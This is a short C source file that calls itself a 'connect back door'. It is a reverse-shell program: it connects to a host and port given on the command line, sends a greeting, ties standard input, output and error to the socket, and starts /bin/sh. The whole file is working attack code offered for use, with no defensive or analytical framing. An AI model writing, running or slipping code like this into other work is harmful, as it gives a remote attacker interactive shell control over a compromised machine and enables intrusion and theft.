//
// Created by seven on 16-7-21.
//
#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <zconf.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h> 

typedef struct sockaddr SA;
int sock;
char shell[]="/bin/sh";
char message[]="Hello, welcome!\n";
void usage(char* prog) {
    printf("\t\t connect back door\n\n");
    printf("Usage: %s <reflect ip> <port>\n", prog);
    exit(-1);
}
int isIP(char* str) {
    struct in_addr addr;  
    int ret;  
    volatile int local_errno;  
    errno = 0;  
    ret = inet_pton(AF_INET, str, &addr);  
    local_errno = errno;  
    if (ret > 0)  
    fprintf(stderr, "\"%s\" is a valid IPv4 address\n", str);  
    else if (ret < 0)  
    fprintf(stderr, "EAFNOSUPPORT: %d\n", strerror(local_errno));  
    else   
    fprintf(stderr, "\"%s\" is not a valid IPv4 address\n", str);  
    return ret;
}
int main(int argc, char** argv) {
    if(argc < 3) {
        usage((argv[0]));
    }
    struct sockaddr_in server;
    if(!isIP(argv[1])) {
        struct hostent *hptr;
        if((hptr = gethostbyname(argv[1])) == NULL) {
            printf(" gethostbyname error for host:%s\n", argv[1]);
            return 0;
        }
        char str[32];
        inet_ntop(hptr->h_addrtype, hptr->h_addr, str, sizeof(str));
        argv[1] = str;
        printf("ip address is: %s\n", argv[1]);
    }
    if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        printf("Couldn't make socket!\n");
        exit(-1);
    }
    server.sin_addr.s_addr = inet_addr(argv[1]);
    server.sin_family = AF_INET;
    server.sin_port = htons(atoi(argv[2]));
    if (connect(sock, (SA *)&server, sizeof(SA)) == -1) {
        printf("Could not connect to remote shell!\n");
        exit(-1);
    }
    if(send(sock, message, sizeof(message), 0) == -1) {
        printf("Could not send to remote shell!\n");
        exit(-1);
    }
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    execl(shell, "/bin/sh", (char*)0);
    close(sock);
    return 1;
}

